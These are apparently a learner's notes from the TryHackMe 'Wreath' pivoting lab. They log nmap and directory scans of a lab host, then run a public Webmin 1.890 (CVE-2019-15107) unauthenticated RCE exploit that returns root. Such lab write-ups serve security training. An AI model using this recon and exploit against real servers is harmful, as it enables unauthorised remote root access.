```
# try hack me room wreath, pivoting practice
# wreath has its own vpn that is different from the tryhackme one
```

```shell
15:04

┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV 10.200.81.200              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 16:02 EST
Nmap scan report for 10.200.81.200
Host is up (0.14s latency).
Not shown: 980 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c1bd4b4054d8899ce091fc1156ad47e (RSA)
|   256 9355b4d98b70ae8e950dc2b6d20389a4 (ECDSA)
|_  256 f0615a55349bb7b83a46ca7d9fdcfa12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2023-03-02T20:30:19
|_Not valid after:  2024-03-01T20:30:19
|_http-title: Thomas Wreath | Developer
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.89 seconds
```


```shell
# dirsearching and gobustering
15:05

#didnt work
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.81.200:10000 -k -x txt,php,html -t 250

#didnt work
gobuster dir -u http://10.200.81.200:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64 

#worked

┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.200.81.200:80 -x 400,401,403 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.200.81.200-80/_23-03-02_16-10-32.txt

Error Log: /root/.dirsearch/logs/errors-23-03-02_16-10-32.log

Target: http://10.200.81.200:80/

[16:10:33] Starting: 
[16:10:37] 302 -  218B  - /%2e%2e//google.com  ->  https://thomaswreath.thmgoogle.com
[16:10:46] 302 -  259B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  https://thomaswreath.thmCitrix/AccessPlatform/auth/clientscripts/cookies.js
[16:11:08] 302 -  246B  - /engine/classes/swfupload//swfupload.swf  ->  https://thomaswreath.thmengine/classes/swfupload/swfupload.swf
[16:11:08] 302 -  249B  - /engine/classes/swfupload//swfupload_f9.swf  ->  https://thomaswreath.thmengine/classes/swfupload/swfupload_f9.swf
[16:11:08] 302 -  256B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/  ->  https://thomaswreath.thmexamples/jsp/%252e%252e/%252e%252e/manager/html/
[16:11:09] 302 -  234B  - /extjs/resources//charts.swf  ->  https://thomaswreath.thmextjs/resources/charts.swf
[16:11:11] 302 -  244B  - /html/js/misc/swfupload//swfupload.swf  ->  https://thomaswreath.thmhtml/js/misc/swfupload/swfupload.swf

```

```shell
# Moved on from the webserver stuff for now and found an exploit that allows for unauthenticated remote code execution
#https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py
# it works

┌──(root㉿kali)-[/home/kali/Documents/tryhackme/wreath]
└─# python3 webmin-1.890_exploit.py 10.200.81.200 10000 id


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
****
```

```shell
# downloaded script for exploitation, network is being fucky put in to reset going to try different method of setting up chisel and proxy chains
https://github.com/MuirlandOracle/CVE-2019-15107
```